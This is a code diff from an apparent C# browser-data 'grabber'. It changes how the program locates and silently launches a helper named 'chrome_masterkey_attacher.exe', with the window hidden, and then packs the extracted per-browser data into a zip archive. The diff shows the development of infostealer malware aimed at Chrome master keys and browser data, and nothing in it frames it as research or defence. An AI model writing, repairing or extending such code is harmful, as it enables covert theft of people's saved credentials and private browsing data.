@@ -23,23 +23,34 @@ namespace ConsoleApp1
             try
             {
                 string exeName = "chrome_masterkey_attacher.exe";
-                if (!File.Exists(exeName))
+                string fullExePath = string.Empty;
+
+                // Check common locations
+                string[] locations = {
+                    AppDomain.CurrentDomain.BaseDirectory,
+                    Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "browserrecovery"),
+                    Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "browserrecovery", "target", "release")
+                };
+
+                foreach (var loc in locations)
                 {
-                    // If it's not in the current directory, it might be in the same folder as the grabber
-                    string altPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, exeName);
-                    if (File.Exists(altPath))
+                    string p = Path.Combine(loc, exeName);
+                    if (File.Exists(p))
                     {
-                        exeName = altPath;
+                        fullExePath = p;
+                        break;
                     }
-                    else
-                    {
-                        return;
-                    }
+                }
+
+                if (string.IsNullOrEmpty(fullExePath))
+                {
+                    return;
                 }
 
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
-                    FileName = exeName,
+                    FileName = fullExePath,
+                    WorkingDirectory = Path.GetDirectoryName(fullExePath),
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden
@@ -62,10 +73,10 @@ namespace ConsoleApp1
                 {
                     foreach (var mapping in BrowserMappings)
                     {
-                        string extractDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, mapping.Key);
+                        string extractDir = Path.Combine(Path.GetDirectoryName(fullExePath), mapping.Key);
                         if (Directory.Exists(extractDir))
                         {
-                            AddDirectoryToZip(archive, extractDir, $"browsers/{mapping.Value}");
+                            AddDirectoryToZip(archive, extractDir, $"Browsers/{mapping.Value}");
 
                             // Cleanup
                             try
